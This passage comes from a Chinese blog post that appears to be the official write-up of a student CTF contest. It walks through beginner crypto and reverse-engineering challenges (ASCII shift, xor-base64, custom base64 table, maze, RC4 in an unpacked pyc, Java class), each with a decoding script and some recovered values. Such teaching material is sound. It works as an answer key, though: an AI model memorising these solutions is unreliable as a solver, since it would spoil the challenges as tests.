<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>发现了核心加密代码以后，开始思考为什么修改数字就能影响结果呢。这时候通过自己已有的知识突然想到会不会是老师上课时讲到的ASCII码（题外话：通常解题还是要一些基础知识来作为支撑的，如果没有基础知识那么永远都不会搞清楚为什么的，所以有时候碰到一些自己没有学过内容的题目就不要浪费时间去想了，打好基础再进行下一步做题比较好）。那么接下来从网上找到ASCII码表，并且这行代码好像是三目运算符，通过这行代码猜测一下会不会是字符的ASCII码值小于100就加200，如果大于就加30。<br>有了这个猜测之后，就可以尝试验证一下自己的猜测（题外话：这种猜测-&gt;验证-&gt;得出结论的过程是一种非常好的学习方法，也是科学研究的一种思想），通过ASCII码表看看，如果以100为分界线的话，那么对应的分界字符应该为”d”，这时候看ASCII码表，发现”a”对应的是97，那么按照上面得出的结论的话，输入”a”应该得到的会是297，运行程序，发现和自己的猜测没有区别，那么再进行分界字符的验证，”d”的ASCII码为100，那么应该会执行加30的操作，得到的结果应该是130，运行程序进行验证，发现和自己想的是一样的，那么差不多就可以得出结论，小于字符”d”的所有字符，都是在原本ASCII码的基础上加200，而大于等于”d”的所有字符，都是在原本ASCII码上加30。<br>得出了这个结论那么怎么对那么一长串字符进行解密呢？<br>这时候再随便输入一些字符，或者各种思考，突然顿悟（题外话：顿悟是一个非常关键的过程，这个过程可能会让你在未来的学习中脱离瓶颈），发现所有的字符都是3位数，那么我按3位数为一组对这些字符进行分割不就好了。</p>
<h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>密文字符为这一长串<code>132138297133153267141140133144297146147138297146131295285233155</code>，那么将它以三个为一组进行划分，得到：<code>132 138 297 133 153 267 141 140 133 144 297 146 147 138 297 146 131 295 285 233 155</code>，好像这么看来也找不出什么规律，再仔细回顾一下那段核心代码，发现”d”对应的是130，这个”d”和第一个132有什么关系呢，再看一下ASCII码表可以发现，位置相差2，从d往后加两位发现是f，这时候突然想到，结果不是以<code>flag&#123;xxx&#125;</code>这种形式的吗，第一位如果是”f”的话，那么第二位会不会是”l”，那么前4位会不会就是”flag”，带着这个想法去运行程序测试一下，发现果然是这样的，并且发现<code>flag&#123;</code>这5位对应的值是<code>132 138 297 133 153</code>。然后再进行观察，发现这些3位数有1有2，并且结合开始的分析，ASCII码表以”d”为界限进行加200或加30，那么这些1和2应该就是和这个加的数有关。<br>到这里，差不多就已经知道了接下去应该怎么做，有两种办法可以解密，第一种就是笨一点的一个一个字符去猜测去试，最终试出答案；第二种就是写解密代码，对上面的猜测和结论进行分析，并且转化为代码的形式。</p>
<h4 id="第一种解密方式"><a href="#第一种解密方式" class="headerlink" title="第一种解密方式"></a>第一种解密方式</h4><p>这种解密方式就是试，一个一个字符去试，没什么过多好讲的。<br>这种解密的方式其实可以在一开始随便多运行几次程序，多试几个字符串就能发现规律。<br>在对程序进行输入内容的时候，两次运行程序并且输入”abc”发现加密结果是一样的，那么就可以猜得到，一个一个字符去试出最终的flag，其实再深一点，继续试，直接输入一些简单常用的flag（就像试别人的密码，123456、admin、admin123、admin123456这种是一个道理），然后输入<code>flag&#123;hello&#125;</code>得到的值为<code>132138297133153134131138138141155</code>，仔细看一下发现有几位字符和结果字符差不多，然后进一步试，就可以发现前面几个字符就是”flag{“，然后括号中的内容就是不断的试。</p>
<h4 id="第二种解密方式"><a href="#第二种解密方式" class="headerlink" title="第二种解密方式"></a>第二种解密方式</h4><p>这种方式就是分析核心代码，去解密它的核心算法，并且使用C语言代码编写解密程序。<br>首先上面已经分析出来了以”d”为字符接线，ASCII码小于”d”的就在自身ASCII码值上加200，否则加30，并且每个字符都是以3个字符为一组，那么这时候编写解密代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 定义一个数组，保存以3个为一组的字符</span></span><br><span class="line">    <span class="type">int</span> flag[] = &#123;<span class="number">132</span>, <span class="number">138</span>, <span class="number">297</span>, <span class="number">133</span>, <span class="number">153</span>, <span class="number">267</span>, <span class="number">141</span>, <span class="number">140</span>, <span class="number">133</span>, <span class="number">144</span>, <span class="number">297</span>, <span class="number">146</span>, <span class="number">147</span>, <span class="number">138</span>, <span class="number">297</span>, <span class="number">146</span>, <span class="number">131</span>, <span class="number">295</span>, <span class="number">285</span>, <span class="number">233</span>, <span class="number">155</span>&#125;;</span><br><span class="line">    <span class="comment">// 循环遍历数组中的每个字符，算了一下数组中有21个字符，那么就循环21次</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">21</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 取每个字符，对其进行判断运算</span></span><br><span class="line">        <span class="type">char</span> ch = flag[i];</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            对于一开始加密的时候，字符如果是大于等于100，则加30，否则加200</span></span><br><span class="line"><span class="comment">            ASCII码的最大值为127，所以d后面的值加密后最大为157</span></span><br><span class="line"><span class="comment">            而d前面的值，最大的也就是c，加密后最大值为299</span></span><br><span class="line"><span class="comment">            所以可以通过200这个分水岭进行界定哪些是d前面的字符，哪些是d后面的字符</span></span><br><span class="line"><span class="comment">            所以超过200的，就是d前面的字符，否则就是d后面的字符</span></span><br><span class="line"><span class="comment">            按照这个逻辑编写if语句</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (ch &gt; <span class="number">200</span>)</span><br><span class="line">            ch = ch - <span class="number">200</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ch = ch - <span class="number">30</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, ch);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写上述代码后，运行，得到结果。<br>但是仔细看一下，发现结果好像不太对劲，怎么还有换行。<br>那么这里就需要适当的在代码中加一些printf语句去查看变量的值，或者是通过调试的方式。<br>通过在if上面增加一行<code>printf(&quot;----------%c\n&quot;, ch);</code>，尝试这样来看一下ch里面保存的是什么值，发现横线（分隔符）后面什么都没有输出，最多就两个括号，然后突然醒悟，ASCII码值最大为127，所以这里最小的值都超过了ASCII码的最大值，那么在if语句中添加一下printf看看ch变量的值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch &gt; <span class="number">200</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ch = ch - <span class="number">200</span>;</span><br><span class="line">    <span class="comment">// 可以适当的在代码中添加一些printf()来看某些变量在代码执行过程中的值</span></span><br><span class="line">    <span class="comment">// 当然如果你知道如何使用IDE打断点调试会更好</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, ch);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    ch = ch - <span class="number">30</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, ch);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对代码稍微进行修改，变成上面这样，运行一下看看，发现还是少了一些字符，这时候不知道怎么办了。<br>问一下周围的大佬，发现好像这段代码也没啥问题，就不知道后续的解了，然后老老实实用第一种解题方式，去一个一个试出答案，这应该会是大多数人的想法。其实可以通过调试或者其他方法去找出这个问题，这个问题其实就是数据溢出了。<br>char类型的变量占用一个字节的内存空间，最大值也就是255，那么flag中的值最大有299，明显大于255，所以这时候在定义<code>ch</code>变量的时候，不能使用char类型，可以使用short、int等等，常用的就是int，所以将定义ch变量的类型改为int即可。<br>最终代码如下，我把下面代码的注释删了，你通过上面的阅读应该很容易理解下面这些代码的意思了，你可以尝试自己在代码旁边写一下注释。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flag[] = &#123;<span class="number">132</span>, <span class="number">138</span>, <span class="number">297</span>, <span class="number">133</span>, <span class="number">153</span>, <span class="number">267</span>, <span class="number">141</span>, <span class="number">140</span>, <span class="number">133</span>, <span class="number">144</span>, <span class="number">297</span>, <span class="number">146</span>, <span class="number">147</span>, <span class="number">138</span>, <span class="number">297</span>, <span class="number">146</span>, <span class="number">131</span>, <span class="number">295</span>, <span class="number">285</span>, <span class="number">233</span>, <span class="number">155</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">21</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> ch = flag[i];</span><br><span class="line">        <span class="keyword">if</span> (ch &gt; <span class="number">200</span>)</span><br><span class="line">            ch = ch - <span class="number">200</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ch = ch - <span class="number">30</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, ch);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时候C语言不够扎实的同学可能又有疑问了，这里用int定义ch的话，ch不应该是一个整数的变量吗，最后它怎么会是字符。<br>其实在内存中没有什么字符和整数的区别，它们一律都是二进制，只不过使用char类型去定义一个变量只会开辟一个字节的空间去保存数据，而使用int类型去定义一个变量会开辟四个字节的空间去保存数据，只不过最后使用printf进行输出时，<code>%c</code>和<code>%d</code>所代表的意义是不同的，<code>%c</code>表示将后面给定变量对应的内存空间中的数据以字符的形式输出，而<code>%d</code>则表示将变量对应的内存空间以整数的形式输出。</p>
<h3 id="结束语-总结"><a href="#结束语-总结" class="headerlink" title="结束语&amp;总结"></a>结束语&amp;总结</h3><p>一道简单的ctf题目可以牵扯出来非常多的知识点，这些都是理论学习，而ctf属于实践学习，在学习计算机的时候，实践学习固然关键，但是也需要非常多的理论学习作为支撑，理论与实践同时并举，这样的学习效率会比只学理论或者只搞实践还要高，所以在未来学习计算机的过程中，一定要重视理论与实践，不要只会做题而不理解深层次的原理，要知其然知其所以然。<br>如果有时候一道题目做了很久都没有进展，那么可能是你的基础知识不够用了，不要太在意题目是否做出来，这时候应该看答案，并且以现有的知识去理解答案中讲到的知识点，如果答案都看不懂的话，那么请去学习基础知识，打好基础再继续做题，否则只是浪费时间。做题不是为了拿多少分，满足自己的成就感，或者是去向别人炫耀，做题只是练习，是让你发现哪里不会，哪里没学懂，然后去学习不懂的地方，请把每一次的做题练习当做找出自己缺点的机会，而不要把练习当成考试。</p>
<h2 id="Reserver"><a href="#Reserver" class="headerlink" title="Reserver"></a>Reserver</h2><h4 id="第一周-3"><a href="#第一周-3" class="headerlink" title="第一周"></a>第一周</h4><h5 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h5><p>用ida打开，shift+f12直接看到flag</p>
<h5 id="xor-base64"><a href="#xor-base64" class="headerlink" title="xor-base64"></a>xor-base64</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p_argc = &amp;argc;</span><br><span class="line"> v9 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"> <span class="built_in">strcpy</span>(s2 <span class="string">&quot;Zm1jZH9kNT46MDw7OD8/NiEiIyUhJC8gIC0vfS8pfHkVRRNCHFg=&quot;</span>);</span><br><span class="line"> <span class="built_in">puts</span>(byte_204C);</span><br><span class="line"> <span class="built_in">puts</span>(byte_206C);</span><br><span class="line"> <span class="built_in">puts</span>(byte_20B0);</span><br><span class="line"> gets(s);</span><br><span class="line"> v5 = <span class="built_in">strlen</span>(s);</span><br><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">   s[i] ^= i;</span><br><span class="line"> base64_encode(s (<span class="type">int</span>)s1);</span><br><span class="line"> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1 s2) )</span><br><span class="line">   <span class="built_in">puts</span>(byte_20CC);</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">   <span class="built_in">puts</span>(byte_2124);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>简单分析代码，将输入的字符串，进行逐位异或，然后进行base64加密。</p>
<p>所以只需反过来解密即可，先base64后异或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = base64.b64decode(<span class="string">b&#x27;Zm1jZH9kNT46MDw7OD8/NiEiIyUhJC8gIC0vfS8pfHkVRRNCHFg=&#x27;</span>)</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher))：</span><br><span class="line">    flag.append(cipher[i] ^ i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure>

<h5 id="base64-change"><a href="#base64-change" class="headerlink" title="base64-change"></a>base64-change</h5><p>跟上题一样，就是把base64换表了，换回来即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;zM1Jzh88m2y5pt49BtO/psb0jNjYihuNEYeIlcr8Fh0xrbrhfLG=&#x27;</span></span><br><span class="line">new_table = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">&quot;+/&quot;</span></span><br><span class="line">cipher = cipher.translate(<span class="built_in">str</span>.maketrans(new_table table))</span><br><span class="line">data = base64.b64decode(cipher)</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))：</span><br><span class="line">    flag.append(i ^ data[i])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure>



<h4 id="第二周-2"><a href="#第二周-2" class="headerlink" title="第二周"></a>第二周</h4><h5 id="game"><a href="#game" class="headerlink" title="game"></a>game</h5><p>是一个简单迷宫问题，通过1，2，3，4控制移动，在map数组中可以找到地图。*<strong>11110100001010000101111#</strong> 并且起点为* 终点为#</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#</span><br><span class="line">把地图分成5*5</span><br><span class="line">0表示可以走，1不能走。</span><br><span class="line">flag就是输入的命令 </span><br></pre></td></tr></table></figure>

<h5 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h5><p>使用pyinstaller 解包，然后用16进制工具修复pyc文件头，在到这个网站去反编译 https：&#x2F;&#x2F;tool.lu&#x2F;pyc&#x2F;。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https：//tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version： Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">s_box key</span>)：</span><br><span class="line">    l = <span class="built_in">len</span>(key)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    T = [</span><br><span class="line">        <span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)：</span><br><span class="line">        T[i] = <span class="built_in">ord</span>(key[i % l])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)：</span><br><span class="line">        j = (j + s_box[i] + T[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i] = s_box[j]</span><br><span class="line">        s_box[j] = s_box[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_crypt</span>(<span class="params">data key</span>)：</span><br><span class="line">    data = (<span class="keyword">lambda</span> <span class="number">.0</span>： [ <span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(data)</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    init(s_box key)</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))：</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i] = s_box[j]</span><br><span class="line">        s_box[j] = s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        data[k] ^= s_box[t]</span><br><span class="line">    <span class="keyword">return</span> b64encode(<span class="built_in">bytes</span>(data)).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>：</span><br><span class="line">    data = <span class="built_in">input</span>(<span class="string">&#x27;Input your flag：&#x27;</span>)</span><br><span class="line">    key = <span class="string">&#x27;This_is_key&#x27;</span></span><br><span class="line">    cipher = rc4_crypt(data key)</span><br><span class="line">    <span class="keyword">if</span> cipher == <span class="string">&#x27;QMJ7AmxdVDXWaEEHW6gynoEjjm47y9OplWykYh3Wwb4QJB9FBHA=&#x27;</span>：</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congratulations&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>：</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Incorrect&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;pause&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>很简单，可以看出是rc4加密，key就是密钥，直接解密就可以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">b&#x27;This_is_key&#x27;</span></span><br><span class="line">rc4 = ARC4.new(key)</span><br><span class="line">data = <span class="string">b&#x27;QMJ7AmxdVDXWaEEHW6gynoEjjm47y9OplWykYh3Wwb4QJB9FBHA=&#x27;</span></span><br><span class="line">data = base64.b64decode(data)</span><br><span class="line"><span class="built_in">print</span>(rc4.decrypt(data))</span><br></pre></td></tr></table></figure>

<h5 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h5><p>是个class文件，拖进InteliJ IDEA中，可以看到java源码，代码很简单，再次不分析。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">180</span> <span class="number">136</span> <span class="number">137</span> <span class="number">147</span> <span class="number">191</span> <span class="number">137</span> <span class="number">147</span> <span class="number">191</span> <span class="number">148</span> <span class="number">136</span> <span class="number">133</span> <span class="number">191</span> <span class="number">134</span> <span class="number">140</span> <span class="number">129</span> <span class="number">135</span> <span class="number">191</span> <span class="number">65</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data：</span><br><span class="line">    flag.append(i - <span class="number">64</span> ^ <span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure>



<blockquote>
<p>致谢</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由衷感谢各位学长学姐的支持涅(他们有点害羞我就不点名了哈~) 到这江工招新赛就结束啦! 也非常感谢校外的几位师傅呜呜,没他们比赛可能办的不会那么顺利TnT,所以鼓励大家也多结交外校的师傅,热情点,被拒绝了挨骂了也没有关系. 最后就是进工作室的新同学们也要好好学习哈 不要想着懒一天明天在学 要想着今天有没有学到明天的东西 摆太久脑子会生锈的&gt;&lt; 任重而道远,山水有相逢,我在江财等你们哈~( bushi </span><br></pre></td></tr></table></figure>


            
        </div>
        <footer class="article-footer">
            <a data-url="https://dik1o.github.io/2024/01/07/Juggle2023-%E5%AE%98%E6%96%B9wp/" data-id="clr5kau850003j8uc17xi32jd" data-title="Juggle2023_官方wp"
               class="article-share-link">Share</a>
            
            
            
            
    <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>


        </footer>
    </div>
    
        
    <nav id="article-nav" class="wow fadeInUp">
        
        
            <div class="article-nav-link-wrap article-nav-link-right">
                
                    
                    
                        <img data-src="https://d-sketon.top/img/backimg/bg1.jpg" data-sizes="auto" alt="新生赛web出题感悟(gzctf)" class="lazyload">
                    
                
                <a href="/2023/11/26/%E6%96%B0%E7%94%9F%E8%B5%9Bweb%E5%87%BA%E9%A2%98%E6%84%9F%E6%82%9F/"></a>
                <div class="article-nav-caption">Older</div>
                <h3 class="article-nav-title">
                    
                        新生赛web出题感悟(gzctf)
                    
                </h3>
            </div>
        
    </nav>


    
</article>











</section>
                
                    <aside id="sidebar">
    <div class="sidebar-wrap wow fadeInRight">
        <div class="sidebar-author">
            <img data-src="/avatar/dikio.png" data-sizes="auto" alt="diki" class="lazyload">
            <div class="sidebar-author-name">diki</div>
            <div class="sidebar-description"></div>
        </div>
        <div class="sidebar-state">
            <div class="sidebar-state-article">
                <div>Posts</div>
                <div class="sidebar-state-number">2</div>
            </div>
            <div class="sidebar-state-category">
                <div>Categories</div>
                <div class="sidebar-state-number">0</div>
            </div>
            <div class="sidebar-state-tag">
                <div>Tags</div>
                <div class="sidebar-state-number">6</div>
            </div>
        </div>
        <div class="sidebar-social">
            
                <div class=icon-github>
                    <a href=https://github.com/dik1o itemprop="url" target="_blank"></a>
                </div>
            
        </div>
        <div class="sidebar-menu">
            
                <div class="sidebar-menu-link-wrap">
                    <a class="sidebar-menu-link-dummy" href="/"></a>
                    <span class="sidebar-menu-icon"></span>
                    <div class="sidebar-menu-link">Home</div>
                </div>
            
                <div class="sidebar-menu-link-wrap">
                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
                    <span class="sidebar-menu-icon"></span>
                    <div class="sidebar-menu-link">Archives</div>
                </div>
            
                <div class="sidebar-menu-link-wrap">
                    <a class="sidebar-menu-link-dummy" href="/about"></a>
                    <span class="sidebar-menu-icon"></span>
                    <div class="sidebar-menu-link">About</div>
                </div>
            
                <div class="sidebar-menu-link-wrap">
                    <a class="sidebar-menu-link-dummy" href="/friend"></a>
                    <span class="sidebar-menu-icon"></span>
                    <div class="sidebar-menu-link">Friend</div>
                </div>
            
        </div>
    </div>
    
        

    
        
    <div class="widget-wrap wow fadeInRight">
        <h3 class="widget-title">Tag Cloud</h3>
        <div class="widget tagcloud">
            <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/gzctf/" style="font-size: 10px;">gzctf</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/web/" style="font-size: 20px;">web</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a>
        </div>
    </div>


    
        
    <div class="widget-wrap wow fadeInRight">
        <h3 class="widget-title">Archives</h3>
        <div class="widget">
            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
        </div>
    </div>


    
</aside>

                
            </div>
            <footer id="footer" class="wow fadeInUp">
    <div style="width: 100%; overflow: hidden"><div class="footer-line"></div></div>
    <div class="outer">
        <div id="footer-info" class="inner">
            
            <div>
                <span class="icon-copyright"></span>
                2020-2024
                <span class="footer-info-sep"></span>
                diki
            </div>
            
                <div>
                    Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
                    Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
                </div>
            
            
                <div>
                    <span class="icon-brush"></span>
                    9.6k
                    &nbsp;|&nbsp;
                    <span class="icon-coffee"></span>
                    00:40
                </div>
            
            
                <div>
                    <span class="icon-eye"></span>
                    <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
                    &nbsp;|&nbsp;
                    <span class="icon-user"></span>
                    <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
                </div>
            
        </div>
    </div>
</footer>

        </div>
        <nav id="mobile-nav">
    <div class="sidebar-wrap">
        <div class="sidebar-author">
            <img data-src="/avatar/dikio.png" data-sizes="auto" alt="diki" class="lazyload">
            <div class="sidebar-author-name">diki</div>
